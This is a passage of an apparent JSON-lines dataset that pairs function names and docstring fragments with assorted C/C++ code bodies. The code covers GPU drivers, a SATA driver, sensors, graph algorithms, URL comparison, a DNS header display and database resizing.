VK_PIPELINE_STAGE_GEOMETRY_SHADER_BIT                   |\\n        VK_PIPELINE_STAGE_COMPUTE_SHADER_BIT                    |\\n        VK_PIPELINE_STAGE_2_COPY_BIT_KHR                        |\\n        VK_PIPELINE_STAGE_2_RESOLVE_BIT_KHR                     |\\n        VK_PIPELINE_STAGE_2_BLIT_BIT_KHR                        |\\n        VK_PIPELINE_STAGE_2_CLEAR_BIT_KHR                       |\\n        VK_PIPELINE_STAGE_2_PRE_RASTERIZATION_SHADERS_BIT_KHR   |\\n#if VKI_RAY_TRACING\\n        VK_PIPELINE_STAGE_RAY_TRACING_SHADER_BIT_KHR            |\\n        VK_PIPELINE_STAGE_ACCELERATION_STRUCTURE_BUILD_BIT_KHR  |\\n#endif\\n        VK_PIPELINE_STAGE_TRANSFER_BIT                          |\\n        VK_PIPELINE_STAGE_TRANSFORM_FEEDBACK_BIT_EXT;\\n\\n    Pal::HwPipePoint dstPipePoint;\\n\\n    \/\/ Check if bottom-of-pipe waiting is enough.\\n    if ((flags & ~dstBottomOfPipeFlags) == 0)\\n    {\\n        dstPipePoint = Pal::HwPipeBottom;\\n    }\\n    \/\/ Check if pre-rasterization waiting is enough.\\n    else if ((flags & ~dstPreRasterizationFlags) == 0)\\n    {\\n        dstPipePoint = Pal::HwPipePreRasterization;\\n    }\\n    \/\/ Otherwise see if post-index-fetch waiting is enough.\\n    else if ((flags & ~dstPostIndexFetchFlags) == 0)\\n    {\\n        dstPipePoint = Pal::HwPipePostPrefetch;\\n    }\\n    \/\/ Otherwise we have to resort to top-of-pipe waiting.\\n    else\\n    {\\n        dstPipePoint = Pal::HwPipeTop;\\n    }\\n\\n    return dstPipePoint;\\n}'}","id":5132}
{"content":"{'function_name': 'Mtensdata', 'docstring': '\/\/ now advance the group index to the next group', 'code': 'int main (int argc, char **argv)\\n{\\n    \/\/ figure out which center of mass files to use\\n    Ntypes = (size_t)(argc - 2);\\n    Ngroups = (size_t)std::atoi(argv[1]);\\n    CMdata = (double **)std::malloc(Ntypes * sizeof(double *));\\n    for (size_t ii=0; ii != Ntypes; ++ii)\\n    {\\n        CMdata[ii] = (double *)std::malloc(Ngroups * 4UL * sizeof(double));\\n        auto f = std::fopen(argv[2+ii], \"rb\");\\n        auto count = std::fread(CMdata[ii], sizeof(double), 4UL * Ngroups, f);\\n        assert(count == 4UL * Ngroups);\\n        std::fclose(f);\\n    }\\n\\n    Mtens_callback c;\\n\\n    group_particles<> ( c );\\n\\n    #ifdef DM\\n    c.normalize_mass();\\n    #endif\\n\\n    #if defined GAS\\n    #   define TYPE \"GAS\"\\n    #elif defined DM\\n    #   define TYPE \"DM\"\\n    #elif defined STARS\\n    #   define TYPE \"STARS\"\\n    #elif defined BH\\n    #   define TYPE \"BH\"\\n    #endif\\n\\n    #define ROOT \"Mtens_results\"\\n\\n    auto f = std::fopen(ROOT \"\/Mtens_\" TYPE \".bin\", \"wb\");\\n    for (const auto &Mtensitem : c.grp_Mtens)\\n        Mtensitem.save(f);\\n    std::fclose(f);\\n\\n    #undef TYPE\\n    #undef ROOT\\n\\n\\n    return 0;\\n}'}","id":5136}
{"content":"{'function_name': 'Gpio', 'docstring': '\/\/ make sure that the GPIO is exposed to sysfs', 'code': 'Result startTransmission(uint8_t command, T& data)\\n    {\\n        clk_  = Output;\\n        data_ = Output;\\n\\n        clk_  = Low;\\n        data_ = High;\\n\\n        \/\/ Transmission Start\\n\\n        clk_  = High;\\n        data_ = Low;\\n        clk_  = Low;\\n        clk_  = High;\\n        data_ = High;\\n        clk_  = Low;\\n        data_ = Low;\\n\\n        for( uint8_t mask = 0x80u; mask; mask >>= 1u )\\n        {\\n            writeDataBit(command & mask);\\n        }\\n\\n        data_ = Input;\\n\\n        clockCycle();\\n\\n        \/\/ datasheet states that conversion takes 320 ms for a 14-bit conversion\\n        using namespace std::chrono_literals;\\n\\n        auto t0 = std::chrono::steady_clock::now();\\n\\n        std::this_thread::sleep_for(320ms);\\n\\n        while( data_.isHigh() )\\n        {\\n            auto const t1 = std::chrono::steady_clock::now();\\n\\n            auto const t = std::chrono::duration_cast<\\n                std::chrono::milliseconds\\n            >(t1 - t0);\\n\\n            if( t > 500ms )\\n            {\\n                return Result::Timeout;\\n            }\\n        }\\n\\n        Crc crc;\\n\\n        crc.add(command);\\n\\n        for( auto i = 0u; i < sizeof(T); ++i )\\n        {\\n            auto const byte = readByte();\\n\\n            data <<= 8u;\\n            data  |= byte;\\n\\n            crc.add(byte);\\n        }\\n\\n        auto const expected_crc = readByte();\\n\\n        data_ = Output;\\n        data_ = High;\\n\\n        if( crc.reversed().value() != expected_crc )\\n        {\\n            return Result::CrcError;\\n        }\\n\\n        return Result::Success;\\n    }'}","id":5139}
{"content":"{'function_name': 'ahci_setup_fis', 'docstring': '\/* host to device *\/', 'code': 'static int ahci_sata_connect(struct ahci_channel *ch) {\\n  u_int32_t status;\\n  int timeout, found = 0;\\n\\n  \/* Wait up to 100ms for \"connect well\" *\/\\n  for (timeout = 0; timeout < 1000; timeout++) {\\n    status = ATA_INL(ch->r_mem, AHCI_P_SSTS);\\n    if ((status & ATA_SS_DET_MASK) != ATA_SS_DET_NO_DEVICE) found = 1;\\n    if (((status & ATA_SS_DET_MASK) == ATA_SS_DET_PHY_ONLINE) &&\\n        ((status & ATA_SS_SPD_MASK) != ATA_SS_SPD_NO_SPEED) &&\\n        ((status & ATA_SS_IPM_MASK) == ATA_SS_IPM_ACTIVE))\\n      break;\\n    if ((status & ATA_SS_DET_MASK) == ATA_SS_DET_PHY_OFFLINE) {\\n      if (bootverbose) {\\n        device_printf(ch->dev, \"SATA offline status=%08x\\\\n\", status);\\n      }\\n      return (0);\\n    }\\n    if (found == 0 && timeout >= 100) break;\\n    DELAY(100);\\n  }\\n  if (timeout >= 1000 || !found) {\\n    if (bootverbose) {\\n      device_printf(ch->dev, \"SATA connect timeout time=%dus status=%08x\\\\n\",\\n                    timeout * 100, status);\\n    }\\n    return (0);\\n  }\\n  if (bootverbose) {\\n    device_printf(ch->dev, \"SATA connect time=%dus status=%08x\\\\n\",\\n                  timeout * 100, status);\\n  }\\n  \/* Clear SATA error register *\/\\n  ATA_OUTL(ch->r_mem, AHCI_P_SERR, 0xffffffff);\\n  return (1);\\n}'}","id":5140}
{"content":"{'function_name': 'BellmanFord', 'docstring': '\/\/ RELAXATION', 'code': 'int main(int argc, char const *argv[])\\n{\\n\\t\/* code *\/\\n  \/* Soln soln *\/\\n  \/\/ freopen(\"input.txt\",\"r\",stdin);\\n  \/\/ freopen(\"output.txt\",\"w\",stdout);\\n\\n    ios_base::sync_with_stdio(0);\\n    cin.tie(0);\\n    cout.tie(0);\\n\\n    cin>>n>>m;\\n    \/\/g  = new vector< int >[n+10];\\n    \/\/isvisited = new bool[n+10];\\n    dis = new int[n+10];\\n    weight = new int[n+10];\\n    \/\/cout<<\"ok0\\\\n\";\\n    for(int i=0; i<=n; i++){    dis[i] = INF;  }\\n    int a,b,c;\\n    \/\/cout<<\"ok01\\\\n\";\\n    for(int i=1; i<=m; i++){\\n        cin>>a>>b>>c;\\n        \/\/g[a].push_back(b);\\n        \/\/g[b].push_back(a);\\n      \/\/  cout<<\"here \"<<i<<\"\\\\n\";\\n        pair<int, int> p(a,b);\\n        E[i] = p;\\n        weight[i] = c;\\n    }\\n    \/\/cout<<\"ok1\"<<\"\\\\n\";\\n    \\n    cout<<BellmanFord()<<\"\\\\n\";\\n    for(int i=1; i<=n; i++){    cout<<dis[i]<<\" \"; } cout<<\"\\\\n\";\\n    try{\\n        \/\/delete[] g;\\n        delete[] dis;\\n        \/\/delete[] isvisited;\\n        delete[] weight;\\n    }catch(exception& x){\\n        cout<<\"FUCK!\";\\n        cout<<x.what()<<\"\\\\n\";\\n    }\\n    \\n\\treturn 0;\\n}'}","id":5143}
{"content":"{'function_name': 'uint32_cntbits', 'docstring': '\/\/ COMPILER_', 'code': 'inline uint32_t uint32_cntlz(uint32_t _val)\\n\\t{\\n#if COMPILER_GCC || COMPILER_CLANG\\n\\t\\treturn __builtin_clz(_val);\\n#elif COMPILER_MSVC && PLATFORM_WINDOWS\\n\\t\\tunsigned long index;\\n\\t\\t_BitScanReverse(&index, _val);\\n\\t\\treturn 31 - index;\\n#else\\n\\t\\treturn uint32_cntlz_ref(_val);\\n#endif \/\/ COMPILER_\\n\\t}'}","id":5148}
{"content":"{'function_name': 'loop', 'docstring': '\/\/    delay(10000);   \/\/ 60 second', 'code': 'void getHTData()\\n{\\n  \/\/ Reading temperature or humidity takes about 250 milliseconds!\\n  \/\/ Sensor readings may also be up to 2 seconds \\'old\\' (its a very slow sensor)\\n  float h = dht.readHumidity();\\n  \/\/ Read temperature as Celsius\\n  float t = dht.readTemperature();\\n  \/\/ Read temperature as Fahrenheit\\n  float f = dht.readTemperature(true);\\n  \\n  \/\/ Check if any reads failed and exit early (to try again).\\n  if (isnan(h) || isnan(t) || isnan(f)) {\\n    dbg.println(\"Failed to read from DHT sensor!\");\\n    return;\\n  }\\n\\n  \/\/ Compute heat index\\n  \/\/ Must send in temp in Fahrenheit!\\n    float hi = dht.computeHeatIndex(f, h);    \\n    dhtbuf[0] = h;\\n    dhtbuf[1] = t;\\n    \/*\\n    dbg.print(\"Humidity: \"); \\n    dbg.print(h);\\n    dbg.print(\" %\\\\t\");\\n    dbg.print(\"Temperature: \"); \\n    dbg.println(t);    \\n    *\/\\n    char buf[3];\\n    String HH, TT;\\n    buf[0] = 0x30 + dhtbuf[1] \/ 10;\\n    buf[1] = 0x30 + dhtbuf[1] % 10;\\n    TT = (String(buf)).substring( 0, 2 );\\n    buf[0] = 0x30 + dhtbuf[0] \/ 10;\\n    buf[1] = 0x30 + dhtbuf[0] % 10;\\n    HH = (String(buf)).substring( 0, 2 );\\n    \/\/updateDHT11( TT, HH );\\n    setData(TT, HH);  \\n}'}","id":5154}
{"content":"{'function_name': 'IKasin', 'docstring': '\/\/ any more error implies something is wrong with the solver', 'code': 'inline double IKasin(double f)\\n{\\nIKFAST_ASSERT( f > -1-IKFAST_SINCOS_THRESH && f < 1+IKFAST_SINCOS_THRESH ); \/\/ any more error implies something is wrong with the solver\\nif( f <= -1 ) return -IKPI_2;\\nelse if( f >= 1 ) return IKPI_2;\\nreturn asin(f);\\n}'}","id":5159}
{"content":"{'function_name': 'binaryToString', 'docstring': '\/* TODO: Your code here *\/', 'code': 'string stringToBinary(string charString, HuffmanNode* huffmanTree) {\\n    \/* TODO: Your code here *\/\\n    string x = \"\";\\n    std::map<char, string> huffmanMap = huffmanTreeMap(huffmanTree);\\n    for (const char & c: charString) {\\n      x += huffmanMap.at(c);\\n    }\\n    return x;\\n}'}","id":5160}
{"content":"{'function_name': 'ChiSquared', 'docstring': '\/\/dataSum is already the square of the error', 'code': 'double ChiSquaredMC(int intMin, int intMax, TF1* fit_b,TH1D* h_mc){\\n\\t\/\/set the range for chi2\\n\\tdouble xmin = h_mc->GetXaxis()->GetBinCenter(1)-0.5;\\n\\t\/\/calculate the chi2\\n\\tdouble chi2 = 0.0;\\n\\tdouble intError = fit_b->IntegralError(intMin,intMax);\\n\\tdouble dataSum = 0.0;\\n\\tdouble fitSum = fit_b->Integral(intMin,intMax);\\n\\tfor(int i = intMin; i < intMax; i++)\\n\\t{\\n\\t\\tint binNum = (int) i - xmin + 1;\\n\\t\\tdouble mc_events = h_mc->GetBinContent(binNum);\\n\\t\\tdataSum += mc_events;\\n\\t}\\n\\t\/\/add bkg to MC signal\\n\\tdataSum += fitSum;\\t\\n\\t\/\/dataSum is already the square of the error\\n\\tchi2 = (dataSum - fitSum)*(dataSum - fitSum)  \/ (dataSum + intError*intError);\\n\\treturn chi2;\\n}'}","id":5166}
{"content":"{'function_name': 'MimeOleCompareUrlSimple', 'docstring': '\/\/ Done\\r', 'code': 'HRESULT MimeOleCompareUrl(LPCSTR pszCurrentUrl, BOOL fUnEscapeCurrent, LPCSTR pszCompareUrl, BOOL fUnEscapeCompare)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    LPSTR       pszUrl1=(LPSTR)pszCurrentUrl;\\r\\n    LPSTR       pszUrl2=(LPSTR)pszCompareUrl;\\r\\n    CHAR        chPrev=\\'\\\\0\\';\\r\\n    CHAR        chUrl1;\\r\\n    CHAR        chUrl2;\\r\\n    ULONG       cb;\\r\\n\\r\\n    \/\/ Stack Strings\\r\\n    STACKSTRING_DEFINE(rCurrentUrl, 255);\\r\\n    STACKSTRING_DEFINE(rCompareUrl, 255);\\r\\n\\r\\n    \/\/ fUnEscapeCurrent\\r\\n    if (fUnEscapeCurrent)\\r\\n    {\\r\\n        \/\/ Get Size\\r\\n        cb = lstrlen(pszCurrentUrl) + 1;\\r\\n\\r\\n        \/\/ Set Size\\r\\n        STACKSTRING_SETSIZE(rCurrentUrl, cb);\\r\\n\\r\\n        \/\/ Copy\\r\\n        CopyMemory(rCurrentUrl.pszVal, pszCurrentUrl, cb);\\r\\n\\r\\n        \/\/ Dupe It\\r\\n        CHECKHR(hr = UrlUnescapeA(rCurrentUrl.pszVal, NULL, NULL, URL_UNESCAPE_INPLACE));\\r\\n\\r\\n        \/\/ Adjust pszUrl1\\r\\n        pszUrl1 = rCurrentUrl.pszVal;\\r\\n    }\\r\\n\\r\\n    \/\/ fUnEscapeCurrent\\r\\n    if (fUnEscapeCompare)\\r\\n    {\\r\\n        \/\/ Get Size\\r\\n        cb = lstrlen(pszCompareUrl) + 1;\\r\\n\\r\\n        \/\/ Set Size\\r\\n        STACKSTRING_SETSIZE(rCompareUrl, cb);\\r\\n\\r\\n        \/\/ Copy\\r\\n        CopyMemory(rCompareUrl.pszVal, pszCompareUrl, cb);\\r\\n\\r\\n        \/\/ Dupe It\\r\\n        CHECKHR(hr = UrlUnescapeA(rCompareUrl.pszVal, NULL, NULL, URL_UNESCAPE_INPLACE));\\r\\n\\r\\n        \/\/ Adjust pszUrl2\\r\\n        pszUrl2 = rCompareUrl.pszVal;\\r\\n    }\\r\\n\\r\\n    \/\/ Skip leading white space\\r\\n    while(*pszUrl1 && (\\' \\' == *pszUrl1 || \\'\\\\t\\' == *pszUrl1))\\r\\n        pszUrl1++;\\r\\n    while(*pszUrl2 && (\\' \\' == *pszUrl2 || \\'\\\\t\\' == *pszUrl2))\\r\\n        pszUrl2++;\\r\\n\\r\\n    \/\/ Start the loop\\r\\n    while(*pszUrl1 && *pszUrl2)\\r\\n    {\\r\\n        \/\/ Case Insensitive\\r\\n        chUrl1 = TOUPPERA(*pszUrl1);\\r\\n        chUrl2 = TOUPPERA(*pszUrl2);\\r\\n\\r\\n        \/\/ Special case search for \\'\/\\'\\r\\n        if (\\':\\' == chPrev && \\'\/\\' == chUrl2 && \\'\/\\' != *(pszUrl2 + 1) && \\'\/\\' == chUrl1 && \\'\/\\' == *(pszUrl1 + 1))\\r\\n        {\\r\\n            \/\/ Next\\r\\n            pszUrl1++;\\r\\n\\r\\n            \/\/ Done\\r\\n            if (\\'\\\\0\\' == *pszUrl1)\\r\\n            {\\r\\n                hr = S_FALSE;\\r\\n                break;\\r\\n            }\\r\\n\\r\\n            \/\/ Rset chUrl1\\r\\n            chUrl1 = TOUPPERA(*pszUrl1);\\r\\n        }\\r\\n\\r\\n        \/\/ Not Equal\\r\\n        if (chUrl1 != chUrl2)\\r\\n        {\\r\\n            hr = S_FALSE;\\r\\n            break;\\r\\n        }\\r\\n\\r\\n        \/\/ Save Prev\\r\\n        chPrev = *pszUrl1;\\r\\n\\r\\n        \/\/ Next\\r\\n        pszUrl1++;\\r\\n        pszUrl2++;\\r\\n    }\\r\\n\\r\\n    \/\/ Skip over trailing whitespace\\r\\n    while(*pszUrl1 && (\\' \\' == *pszUrl1 || \\'\\\\t\\' == *pszUrl1))\\r\\n        pszUrl1++;\\r\\n    while(*pszUrl2 && (\\' \\' == *pszUrl2 || \\'\\\\t\\' == *pszUrl2))\\r\\n        pszUrl2++;\\r\\n\\r\\n    \/\/ Raid 63823: Mail : Content-Location Href\\'s inside the message do not work if there is a Start Parameter in headers\\r\\n    \/\/ Skim over remaining \\'\/\\' in both urls\\r\\n    while (*pszUrl1 && \\'\/\\' == *pszUrl1)\\r\\n        pszUrl1++;\\r\\n    while (*pszUrl2 && \\'\/\\' == *pszUrl2)\\r\\n        pszUrl2++;\\r\\n\\r\\n    \/\/ No substrings\\r\\n    if (\\'\\\\0\\' != *pszUrl1 || \\'\\\\0\\' != *pszUrl2)\\r\\n        hr = S_FALSE;\\r\\n\\r\\n    \/\/ file:\/\/d:\\\\test\\\\foo.mhtml == d:\\\\test\\\\foo.mhtml\\r\\n    if (S_FALSE == hr && StrCmpNI(pszCurrentUrl, \"file:\", 5) == 0)\\r\\n    {\\r\\n        \/\/ Skip over file:\\r\\n        LPSTR pszRetryUrl = (LPSTR)(pszCurrentUrl + 5);\\r\\n\\r\\n        \/\/ Skip over forward slashes\\r\\n        while(*pszRetryUrl && \\'\/\\' == *pszRetryUrl)\\r\\n            pszRetryUrl++;\\r\\n\\r\\n        \/\/ Compare Again\\r\\n        hr = MimeOleCompareUrl(pszRetryUrl, fUnEscapeCurrent, pszCompareUrl, fUnEscapeCompare);\\r\\n    }\\r\\n\\r\\n\\r\\nexit:\\r\\n    \/\/ Cleanup\\r\\n    STACKSTRING_FREE(rCurrentUrl);\\r\\n    STACKSTRING_FREE(rCompareUrl);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":5169}
{"content":"{'function_name': 'getCC', 'docstring': '\/\/\u6cbf\u5706k1\u9006\u65f6\u9488\u7ed9\u51fa\uff0c\u76f8\u5207\u7ed9\u51fa\u4e24\u4e2a', 'code': 'vector<point> TangentCP(circle k1,point k2){\\n\\t\/\/\u6cbf\u5706k1\u9006\u65f6\u9488\u7ed9\u51fa\\n\\tdouble a=(k2-k1.o).abs(),b=k1.r*k1.r\/a,c=sqrt(max(0.0,k1.r*k1.r-b*b));\\n\\tpoint k=(k2-k1.o).unit(),m=k1.o+k*b,del=k.turn90()*c;\\n\\treturn {m-del,m+del};\\n}'}","id":5172}
{"content":"{'function_name': 'checkJointCoordinates', 'docstring': '\/\/returns true should the coordinates be within bounds set by paramaters\\r', 'code': 'bool cartToJoint(JOINT &temp, JOINT &tempStart) {\\r\\n\\t\/\/this funtion basically shortens down the inverse kin process for the purpose of trajectory planning\\r\\n\\tbool error;\\r\\n\\tjointReturn jointSolution;\\r\\n\\tdouble distance1, distance2;\\r\\n\\r\\n\\terror = 1;\\r\\n\\tcout << \"===Inputing trajectory frame===\" << endl;\\r\\n\\tjointSolution = INVKIN(inputCartCoordinates());\\r\\n\\r\\n\\r\\n\\tif (jointSolution.configValid == 0) {\\r\\n\\t\\tcout << \"Selected position is outside of workspace, CANCELLED ACTION\" << endl;\\r\\n\\t\\terror =  0;\\r\\n\\t}\\r\\n\\telse {\\r\\n\\t\\t\\r\\n\\t\\tif (checkJointCoordinates(jointSolution.config1)) {\\r\\n\\t\\t\\tdistance1 = jointDistanceToViaPoint(jointSolution.config1, tempStart);\\r\\n\\t\\t}\\r\\n\\t\\telse {\\r\\n\\t\\t\\tdistance1 = 99999999;\\r\\n\\t\\t}\\r\\n\\t\\tif (checkJointCoordinates(jointSolution.config2)) {\\r\\n\\t\\t\\tdistance2 = jointDistanceToViaPoint(jointSolution.config2, tempStart);\\r\\n\\t\\t}\\r\\n\\t\\telse {\\r\\n\\t\\t\\tdistance2 = 99999999;\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tfor (int i = 0; i < 4; i++) {\\r\\n\\t\\t\\ttemp[i] = (distance1 > distance2) ? jointSolution.config2[i] : jointSolution.config1[i];\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif (!checkJointCoordinates(temp)) {\\r\\n\\t\\t\\tcout << \"Both solutions outside the joint limits, CANCELLED ACTION\" << endl;\\r\\n\\t\\t\\terror =  0;\\r\\n\\t\\t}\\r\\n    \\r\\n\\t}\\r\\n\\r\\n\\treturn error;\\r\\n}'}","id":5173}
{"content":"{'function_name': 'fact', 'docstring': '\/\/recursive case', 'code': 'bool isSorted(int*arr,int n)\\n{\\n    \/\/Base Case -\\n    if(n==1)\\n    {\\n        \/\/1 hi element hai , and that is always sorted\\n        return true;\\n    }\\n    \/\/Self Work\\n    \/\/Front check - \\n    if(arr[0]>arr[1])\\n    {\\n        return false;\\n    }\\n\\n    \/\/Recursive case\\n    bool ans = isSorted(arr+1,n-1);\\n    return ans;\\n}'}","id":5175}
{"content":"{'function_name': 'p_gda_distance_weights', 'docstring': '\/\/ invoke the function', 'code': 'SEXP p_gda_kernel_weights(SEXP xp_geoda, double bandwidth, std::string kernel_method, bool use_kernel_diagonals, double power, bool is_inverse, bool is_arc, bool is_mile)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDa\\n  Rcpp::XPtr<GeoDa> ptr(xp_geoda);\\n  GeoDa* geoda = static_cast<GeoDa*> (R_ExternalPtrAddr(ptr));\\n\\n  \/\/ invoke the function\\n  GeoDaWeight* w = gda_distance_weights(geoda, bandwidth, \"\", power, is_inverse, is_arc, is_mile, kernel_method, use_kernel_diagonals);\\n\\n  Rcpp::XPtr<GeoDaWeight> w_ptr(w, true);\\n  return w_ptr;\\n}'}","id":5176}
{"content":"{'function_name': 'printEthernet2TreeCtrl', 'docstring': '\/* \u83b7\u53d6\u6e90\u76eeMAC\u5730\u5740 *\/', 'code': 'int printDNSHeader(const Packet &pkt, HTREEITEM & parentNode)\\n{\\n\\tif (pkt.isEmpty() || pkt.dnsh == NULL || parentNode == NULL)\\n\\t{\\n\\t\\treturn -1;\\n\\t}\\n\\tCString strText, strTmp;\\n\\tstrText.Format(\"\u6807\u8bc6\uff1a0x%04hX (%hu)\", ntohs(pkt.dnsh->identifier), ntohs(pkt.dnsh->identifier));\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\n\\tstrText.Format(\"\u6807\u5fd7\uff1a0x%04hX\", ntohs(pkt.dnsh->flags));\\n\\tstrText += strTmp;\\n\\n\\tHTREEITEM DNSFlagNode = g_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\t\/* \u6807\u5fd7\u5b50\u5b57\u6bb5 *\/\\n\\tswitch (pkt.getDNSFlagsQR())\\n\\t{\\n\\tcase DNS_FLAGS_QR_REQUEST:\\tstrText = \"QR\uff1a; \u67e5\u8be2\u62a5\u6587 \uff080\uff09\";\\tbreak;\\n\\tcase DNS_FLAGS_QR_REPLY:\\tstrText = \"QR\uff1a; \u54cd\u5e94\u62a5\u6587 \uff081\uff09\";\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tswitch (pkt.getDNSFlagsOPCODE())\\n\\t{\\n\\tcase DNS_FLAGS_OPCODE_STANDARD_QUERY:\\t\\t\\tstrText = \"OPCODE\uff1a\u6807\u51c6\u67e5\u8be2 \uff080\uff09\";\\t\\t\\tbreak;\\n\\tcase DNS_FLAGS_OPCODE_INVERSE_QUERY:\\t\\t\\tstrText = \"OPCODE\uff1a\u53cd\u5411\u67e5\u8be2 \uff081\uff09\";\\t\\t\\tbreak;\\n\\tcase DNS_FLAGS_OPCODE_SERVER_STATUS_REQUEST:\\tstrText = \"OPCODE\uff1a\u670d\u52a1\u5668\u72b6\u6001\u8bf7\u6c42 \uff082\uff09\";\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tswitch (pkt.getDNSFlagsAA())\\n\\t{\\n\\tcase 0:\\tstrText = \"AA\uff1a\u975e\u6388\u6743\u56de\u7b54 \uff080\uff09\";\\tbreak;\\n\\tcase 1: strText = \"AA\uff1a\u6388\u6743\u56de\u7b54 \uff081\uff09\";\\t\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\n\\tswitch (pkt.getDNSFlagsTC())\\n\\t{\\n\\tcase 0: strText = \"TC\uff1a\u62a5\u6587\u672a\u622a\u65ad \uff080\uff09\";\\tbreak;\\n\\tcase 1: strText = \"TC\uff1a\u62a5\u6587\u622a\u65ad \uff081\uff09\";\\t\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\n\\tswitch (pkt.getDNSFlagsRD())\\n\\t{\\n\\tcase 0: strText = \"RD\uff1a0\";\\t\\t\\t\\t\\t\\tbreak;\\n\\tcase 1: strText = \"RD\uff1a\u5e0c\u671b\u8fdb\u884c\u9012\u5f52\u67e5\u8be2 \uff081\uff09\";\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tswitch (pkt.getDNSFlagsRA())\\n\\t{\\n\\tcase 0: strText = \"RA\uff1a\u670d\u52a1\u5668\u4e0d\u652f\u6301\u9012\u5f52\u67e5\u8be2 \uff080\uff09\"; break;\\n\\tcase 1: strText = \"RA\uff1a\u670d\u52a1\u5668\u652f\u6301\u9012\u5f52\u67e5\u8be2 \uff081\uff09\";\\tbreak;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tstrText.Format(\"Z\uff1a\u4fdd\u7559\uff08%d\uff09\", pkt.getDNSFlagsZ());\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tswitch (pkt.getDNSFlagsRCODE())\\n\\t{\\n\\tcase DNS_FLAGS_RCODE_NO_ERROR:\\t\\t\\tstrText = \"RCODE\uff1a\u65e0\u5dee\u9519 \uff080\uff09\";\\t\\t\\t\\t\\t\\t\\t break;\\n\\tcase DNS_FLAGS_RCODE_FORMAT_ERROR:\\t\\tstrText = \"RCODE\uff1a\u683c\u5f0f\u5dee\u9519 \uff081\uff09\";\\t\\t\\t\\t\\t\\t\\t break;\\n\\tcase DNS_FLAGS_RCODE_SERVER_FAILURE:\\tstrText = \"RCODE\uff1aDNS\u670d\u52a1\u5668\u95ee\u9898 \uff082\uff09\";\\t\\t\\t\\t\\t\\t break;\\n\\tcase DNS_FLAGS_RCODE_NAME_ERROR:\\t\\tstrText = \"RCODE\uff1a\u57df\u540d\u4e0d\u5b58\u5728\u6216\u51fa\u9519 \uff083\uff09\";\\t\\t\\t\\t\\t break;\\n\\tcase DNS_FLAGS_RCODE_NOT_IMPLEMENTED:\\tstrText = \"RCODE\uff1a\u67e5\u8be2\u7c7b\u578b\u4e0d\u652f\u6301 \uff084\uff09\";\\t\\t\\t\\t\\t break;\\n\\tcase DNS_FLAGS_RCODE_REFUSED:\\t\\t\\tstrText = \"RCODE\uff1a\u5728\u7ba1\u7406\u4e0a\u7981\u6b62 \uff085\uff09\";\\t\\t\\t\\t\\t\\t break;\\n\\tdefault:\\t\\t\\t\\t\\t\\t\\t\\tstrText.Format(\"RCODE\uff1a\u4fdd\u7559\uff08%d\uff09\", pkt.getDNSFlagsRCODE()); break;\\n\\t}\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, DNSFlagNode, 0);\\n\\n\\tstrText.Format(\"\u67e5\u8be2\u8bb0\u5f55\u6570\uff1a%hu\", ntohs(pkt.dnsh->questions));\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\n\\tstrText.Format(\"\u56de\u7b54\u8bb0\u5f55\u6570\uff1a%hu\", ntohs(pkt.dnsh->answer_RRs));\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\n\\tstrText.Format(\"\u6388\u6743\u56de\u7b54\u8bb0\u5f55\u6570\uff1a%hu\", ntohs(pkt.dnsh->authority_RRs));\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\n\\tstrText.Format(\"\u9644\u52a0\u4fe1\u606f\u8bb0\u5f55\u6570\uff1a%hu\", ntohs(pkt.dnsh->additional_RRs));\\n\\tg_pTreeCtrlPacketInfo->InsertItem(strText, parentNode, 0);\\n\\n\\treturn 0;\\n}'}","id":5177}
{"content":"{'function_name': 'IsFrac', 'docstring': '\/\/    eps  <= ceil(x)-x <= 1-eps', 'code': 'inline bool IsEqual(double x, double y)\\n{\\n  if (x > y + MY_EPS)\\n    return (false);\\n  if (x < y - MY_EPS)\\n    return (false);\\n  return (true); \/\/    y-eps  <= x <= y+eps\\n}'}","id":5181}
{"content":"{'function_name': 'ErrIsamSetDatabaseSize', 'docstring': '\/\/  Set new database size only if it is larger than db size.', 'code': 'ERR ISAMAPI ErrIsamResizeDatabase(\\n    __in JET_SESID      vsesid,\\n    __in JET_DBID       vdbid,\\n    __in ULONG  cpgTarget,\\n    _Out_opt_ ULONG *pcpgActual,\\n    __in JET_GRBIT      grbit )\\n{\\n    ERR     err                     = JET_errSuccess;\\n    PIB*    ppib                    = (PIB *)vsesid;\\n    const IFMP ifmp                 = (IFMP)vdbid;\\n    PGNO    pgnoAlloc               = pgnoNull;\\n    PGNO    pgnoLastCurrent         = pgnoNull;\\n    BOOL    fTransactionStarted     = fFalse;\\n    const CPG cpgExtensionSize      = (CPG)UlParam( PinstFromPpib( ppib ), JET_paramDbExtensionSize );\\n    const JET_GRBIT grbitValid      = ( JET_bitResizeDatabaseOnlyGrow | JET_bitResizeDatabaseOnlyShrink );\\n    CPG     cpgCurrent;\\n    CPG     cpgActual = 0;\\n    BOOL    fTrimmed = fFalse;\\n\\n    if ( pcpgActual != NULL )\\n    {\\n        *pcpgActual = cpgActual;\\n    }\\n\\n    \/\/ Invalid grbits.\\n    if ( ( grbit & ~grbitValid ) != 0 